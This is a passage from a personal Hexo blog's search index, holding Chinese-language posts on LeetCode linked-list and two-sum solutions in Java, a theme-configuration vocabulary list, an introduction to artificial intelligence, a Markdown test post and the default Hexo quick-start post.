class="comment"> * CreateTime: 15:10 2022/11/11</span></span><br><span class="line"><span class="comment"> * Description: 进位操作</span></span><br><span class="line"><span class="comment"> * 因为要对下一位操作，对象直接选择链表</span></span><br><span class="line"><span class="comment"> * 遍历链表，判断是否需要进位，然后保留余数，下一位+1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">merge</span><span class="params">(ListNode listNode)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (listNode != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (listNode.val &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="comment">// 赋值余数</span></span><br><span class="line">            listNode.val = listNode.val % <span class="number">10</span>;</span><br><span class="line">            <span class="comment">// 判断是不是末尾</span></span><br><span class="line">            <span class="keyword">if</span> (listNode.next == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 末端新建节点，初始值为0</span></span><br><span class="line">                listNode.next = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 下一位 进 1</span></span><br><span class="line">            listNode.next.val += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        listNode = listNode.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> dataStructure;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 14:32 2022/11/11</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListNode</span> &#123;</span><br><span class="line">    <span class="comment">// 节点值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> val;</span><br><span class="line">    <span class="comment">// 下一个节点</span></span><br><span class="line">    <span class="keyword">public</span> ListNode next;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 赋值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ListNode</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.val = val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构建下一个节点</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ListNode</span><span class="params">(<span class="type">int</span> val, ListNode next)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.val = val;</span><br><span class="line">        <span class="built_in">this</span>.next = next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><ul><li>首先，理解清晰题目考察的方向。暴力破解可行，但应该是最坏的打算！</li><li>明确解题的思路，即算法实现的步骤。</li><li>分阶段实现，测试。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 算法练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>专业词汇积累001</title>
      <link href="/blog/523d7704.html/"/>
      <url>/blog/523d7704.html/</url>
      
        <content type="html"><![CDATA[<h1 id="Professional-Vocabulary-Accumulation-001"><a href="#Professional-Vocabulary-Accumulation-001" class="headerlink" title="Professional Vocabulary Accumulation_001"></a>Professional Vocabulary Accumulation_001</h1><ul><li>Theme Core Configuration Setttings</li><li>主题核心配置设置</li><li>Console reminder if new version released </li><li>如果新版本发布，控制台提示。</li><li>Allow to cache content generation. Introduced in NexT v6.0.0.</li><li>允许缓存内容生成，采用 NexT 6.0.0 版本。</li><li>Remove unnecessary files after hexo generate</li><li>hexo 生成后删除不必要的文件</li><li>Define custom file paths</li><li>定义自定义文件路径</li><li>Create your custom files in site directory <code>source/_data</code> and uncomment needed files below</li><li>在网站目录 <code>source/_data</code> 中创建你的自定义文件，并取消以下所需文件的注释。</li><li>Show multilingual switcher in footer</li><li>在页脚显示多语言切换器</li></ul>]]></content>
      
      
      <categories>
          
          <category> 专业词汇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 专业词汇 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode_两数之和</title>
      <link href="/blog/e44c318d.html/"/>
      <url>/blog/e44c318d.html/</url>
      
        <content type="html"><![CDATA[<h1 id="两数之和"><a href="#两数之和" class="headerlink" title="两数之和"></a>两数之和</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> leetCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 0:58 2022/11/2</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> * 两数之和</span></span><br><span class="line"><span class="comment"> * 给定一个整数数组 nums 和一个整数目标值 target，请你在该数组中找出 和为目标值 target  的那 两个 整数，并返回它们的数组下标。</span></span><br><span class="line"><span class="comment"> * 你可以假设每种输入只会对应一个答案。但是，数组中同一个元素在答案里不能重复出现。</span></span><br><span class="line"><span class="comment"> * 你可以按任意顺序返回答案。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 输入：nums = [2,7,11,15], target = 9</span></span><br><span class="line"><span class="comment"> * 输出：[0,1]</span></span><br><span class="line"><span class="comment"> * 解释：因为 nums[0] + nums[1] == 9 ，返回 [0, 1] 。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 输入：nums = [3,2,4], target = 6</span></span><br><span class="line"><span class="comment"> * 输出：[1,2]</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 输入：nums = [3,3], target = 6</span></span><br><span class="line"><span class="comment"> * 输出：[0,1]</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 只会存在一个有效答案</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 进阶：你可以想出一个时间复杂度小于 O(n2) 的算法吗？</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">one</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] nums = &#123;<span class="number">3</span>, <span class="number">3</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">target</span> <span class="operator">=</span> <span class="number">6</span>;</span><br><span class="line">        <span class="type">int</span>[] result = twoSum(nums, target);</span><br><span class="line">        System.out.println(Arrays.toString(result));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Author: Rupert-Tears</span></span><br><span class="line"><span class="comment">     * CreateTime: 1:01 2022/11/2</span></span><br><span class="line"><span class="comment">     * Description: 获取两数之和为目标值的下标</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        <span class="comment">// 依次读取数组中的数，进行遍历相加，与目标值比对</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i + <span class="number">1</span>; j &lt; nums.length; j++) &#123;</span><br><span class="line">                <span class="comment">// 获取两数之和</span></span><br><span class="line">                <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> nums[i] + nums[j];</span><br><span class="line">                <span class="keyword">if</span> (sum == target) &#123;</span><br><span class="line">                    <span class="type">int</span>[] result = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>];</span><br><span class="line">                    result[<span class="number">0</span>] = i;</span><br><span class="line">                    result[<span class="number">1</span>] = j;</span><br><span class="line">                    <span class="keyword">return</span> result;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人工智能入门</title>
      <link href="/blog/35a0316c.html/"/>
      <url>/blog/35a0316c.html/</url>
      
        <content type="html"><![CDATA[<h1 id="人工智能（Artificial-Intelligence）"><a href="#人工智能（Artificial-Intelligence）" class="headerlink" title="人工智能（Artificial Intelligence）"></a>人工智能（Artificial Intelligence）</h1><h2 id="一：什么是人工智能？"><a href="#一：什么是人工智能？" class="headerlink" title="一：什么是人工智能？"></a>一：什么是人工智能？</h2><h3 id="维基百科定义："><a href="#维基百科定义：" class="headerlink" title="维基百科定义："></a>维基百科定义：</h3><p>人工智能，亦称智机器智能，指由人制造出来的机器所表现出来的智能。</p><p>人工智能的核心问题包括构建能够跟人类类似甚至超卓的推理、知识、规划、学习、交流、感知、移物、使用工具和操控机械的能力等。</p><h3 id="英文释义："><a href="#英文释义：" class="headerlink" title="英文释义："></a>英文释义：</h3><p>Intelligence : “The capacity to learn and solve problems”</p><p>自主学习和解决问题的能力</p><p>Artificial Intelligence : “The simulation of human intelligence by machines”</p><p>机器对人类智能的模仿</p><h3 id="简单理解："><a href="#简单理解：" class="headerlink" title="简单理解："></a>简单理解：</h3><p>人工智能就其本质而言，是机器对人思维或者行为过程的模拟，使其可以像人一样思考或者行动。</p><h2 id="二：人工智能的特点"><a href="#二：人工智能的特点" class="headerlink" title="二：人工智能的特点"></a>二：人工智能的特点</h2><p>过程抽象：输入 &#x3D;&#x3D;&gt; 处理 &#x3D;&#x3D;&gt; 输出</p><p>根据输入信息进行模型结构、权重更新，实现最终优化；</p><p>特点：信息处理、自我学习、优化升级</p><h2 id="三：人工智能应用场景"><a href="#三：人工智能应用场景" class="headerlink" title="三：人工智能应用场景"></a>三：人工智能应用场景</h2><ul><li>金融：市场预测（股票价格预测）、资产管理</li><li>医疗：病例分析、病状区域定位</li><li>房地产：评估合理房价</li><li>工业：芯片质量好坏</li><li>机器视觉：车牌识别、猫狗识别</li><li>自然语言处理：文本生成、情感分类、机器翻译、人机互动</li><li>AI 机器人：智能机器人、AlphaGo、模仿人完成指定任务</li><li>其他：自动驾驶、人脸识别</li></ul><h2 id="四：人工智能的发展阶段"><a href="#四：人工智能的发展阶段" class="headerlink" title="四：人工智能的发展阶段"></a>四：人工智能的发展阶段</h2><h3 id="“强”-人工智能"><a href="#“强”-人工智能" class="headerlink" title="“强” 人工智能"></a>“强” 人工智能</h3><ul><li>机器有真正推理和解决复杂问题的能力，有 “自主意识”</li><li>机器的综合思考能力已达到甚至超越人类</li><li>并非当前 AI 所处阶段<ul><li>无法预估实现 “强” 人工智能还有多远</li></ul></li></ul><h3 id="“弱”-人工智能"><a href="#“弱”-人工智能" class="headerlink" title="“弱” 人工智能"></a>“弱” 人工智能</h3><ul><li>机器不具备真正推理和解决复杂问题的能力，无 “自主意识”</li><li>机器基于某种特征可以解决部分问题，成为一个强有力的工具</li><li>当前 AI 所处阶段</li></ul><h2 id="五：人工智能实现方法"><a href="#五：人工智能实现方法" class="headerlink" title="五：人工智能实现方法"></a>五：人工智能实现方法</h2><h3 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h3><ul><li>人工智能<ul><li>符号学习（实现方法）</li><li>机器学习（实现方法）<ul><li>深度学习<ul><li>监督学习（具体技术）</li><li>非监督学习（具体技术）</li><li>强化学习（具体技术）</li></ul></li></ul></li></ul></li></ul><h3 id="符号学习（Symbolic-learning）"><a href="#符号学习（Symbolic-learning）" class="headerlink" title="符号学习（Symbolic learning）"></a>符号学习（Symbolic learning）</h3><p>​基于逻辑与规则的学习方法，其原理主要为物理符号系统（即符号操作系统）假设和有限合理性原理。</p><h4 id="专家系统"><a href="#专家系统" class="headerlink" title="专家系统"></a>专家系统</h4><ul><li>根据既定的逻辑和顺序告诉机器接下来做什么</li><li>遵循 if…then… 原则</li><li>不能根据新场景动态地优化认知（即升级模型）</li></ul><h3 id="机器学习（Machine-learning）"><a href="#机器学习（Machine-learning）" class="headerlink" title="机器学习（Machine learning）"></a>机器学习（Machine learning）</h3><p>​从数据中寻找规律、建立关系，根据建立的关系去解决问题的方法。</p><ul><li>从数据中学习并实现自我优化与升级</li><li>当前主流的 AI 学习方法</li><li>数据驱动</li><li>AI 未来：符号学习 + 机器学习</li></ul><h2 id="六：机器学习与深度学习"><a href="#六：机器学习与深度学习" class="headerlink" title="六：机器学习与深度学习"></a>六：机器学习与深度学习</h2><p>机器学习：</p><ul><li>一种实现人工智能的方法；</li><li>使用算法来解析数据、从中学习，然后对真实世界中的事件做出决策和预测。比如：垃圾邮件检测、房价预测。</li><li>逻辑回归（Logistic Regression）、线性回归（Linear Regression）</li><li>KNN（K邻近算法）</li><li>决策树（Decision Tree）</li><li>K 均值聚类（K-Means）、聚类（Mean Shift）</li><li>异常检测（Anomaly Detection）</li><li>主成分分析（PCA）</li></ul><p>深度学习：</p><ul><li>一种实现机器学习的技术；</li><li>模仿人类神经网络，建立模型，进行数据分析。比如，人脸识别、语义理解、无人驾驶。</li><li>多层感知器（MLP）</li><li>卷积神经网络（CNN）</li><li>循环神经网络（RNN）</li><li>混合算法（CNN + clustering）</li></ul><h2 id="七：常用-AI-工具"><a href="#七：常用-AI-工具" class="headerlink" title="七：常用 AI 工具"></a>七：常用 AI 工具</h2><ul><li>Python</li><li>Anaconda</li><li>NumPy</li><li>Pandas</li><li>Keras</li><li>Matplotlib</li></ul><h2 id="八：成熟、标准的训练流程"><a href="#八：成熟、标准的训练流程" class="headerlink" title="八：成熟、标准的训练流程"></a>八：成熟、标准的训练流程</h2><ol><li>数据加载及展示</li><li>数据预处理</li><li>模型建立及训练</li><li>模型预测</li><li>结果展示及表现评估</li></ol><p>应用场景：回归任务、分类任务、监督学习、非监督学习、迁移学习、混合算法</p><h2 id="九：模型优化"><a href="#九：模型优化" class="headerlink" title="九：模型优化"></a>九：模型优化</h2><p>接到任务，选什么模型合适？</p><p>模型表现不好，如何优化？</p><h2 id="十：模型评估"><a href="#十：模型评估" class="headerlink" title="十：模型评估"></a>十：模型评估</h2><p>回归任务，如何判断判断模型表现？</p><p>分类任务，如何判断判断模型表现？</p><p>如何可视化模型预测结果？</p>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 人工智能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一篇博客</title>
      <link href="/blog/ff05b5bf.html/"/>
      <url>/blog/ff05b5bf.html/</url>
      
        <content type="html"><![CDATA[<h1 id="Markdown书写格式（一级标题）"><a href="#Markdown书写格式（一级标题）" class="headerlink" title="Markdown书写格式（一级标题）"></a>Markdown书写格式（一级标题）</h1><h2 id="代码展示：（二级标题）"><a href="#代码展示：（二级标题）" class="headerlink" title="代码展示：（二级标题）"></a>代码展示：（二级标题）</h2><p><code>print(&#39;Hello&#39;)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Print(<span class="string">&#x27;Hello&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="图片展示："><a href="#图片展示：" class="headerlink" title="图片展示："></a>图片展示：</h2><img src="http://aiyingke.cn/images/RupertTears.jpg" style="zoom:25%;"><h2 id="引用测试："><a href="#引用测试：" class="headerlink" title="引用测试："></a>引用测试：</h2><blockquote><p>这是一条引用</p></blockquote><h2 id="无序列表："><a href="#无序列表：" class="headerlink" title="无序列表："></a>无序列表：</h2><h3 id="爱好：（三级标题）"><a href="#爱好：（三级标题）" class="headerlink" title="爱好：（三级标题）"></a>爱好：（三级标题）</h3><ul><li>摩托车</li><li>编程</li><li>滑雪</li></ul><h4 id="总结（四级标题）"><a href="#总结（四级标题）" class="headerlink" title="总结（四级标题）"></a>总结（四级标题）</h4><blockquote><p>ctrl + 1 一级标题，ctrl + 2 二级标题，以此类推</p><p>ctrl + shift + &#96; 代码块</p><p>ctrl + shift + I 插入图片</p><p>ctrl + shift + ] 无限列表</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 博客搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/blog/4a17b156.html/"/>
      <url>/blog/4a17b156.html/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
